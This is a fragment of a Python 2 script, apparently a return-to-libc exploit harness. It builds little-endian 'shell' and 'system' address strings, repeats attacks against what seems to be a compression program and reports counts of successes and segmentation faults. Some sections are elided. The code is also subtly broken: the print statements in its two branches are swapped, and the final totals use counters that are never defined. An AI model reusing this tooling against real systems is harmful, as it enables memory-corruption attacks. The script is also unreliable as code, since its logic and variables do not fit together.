...
for address in addresses:
  if len(address)==10:
    shell_address =  "\\x" + address[8:10] + "\\x" + address[6:8] + "\\x" + address[4:6] + "\\x" + address[2:4]  
    print "shell address: " + system_address
  else:
    system_address = "\\x" + address[7:9] + "\\x" +  address[5:7] + "\\x" +  address[3:5] + "\\x0" + address[2:3] #uld switch to system_address
    print "system address: " + shell_address

#Trying repeat_times
while i < repeat_times:
  i += 1
  attack_possible = 0;		#uld: refresh attack state every new iteration 
  ...
  if log.read().find("compress finish") != -1:
  ...
  if attack_possible == 0:
    total_not_possible += 1;
    continue
  else:
    total_ok = total_ok + 1                 						

total_attacks = total_ok + total_some + total_fail + total_np;
print "\nFinal Report : Success: ", total_ok," , Segmentation Fault: ", total_segmentation_faults," , Fail: ",total_fail,\
" , Not Possible: ",total_not_possible,", Total Attacks: ", total_attacks
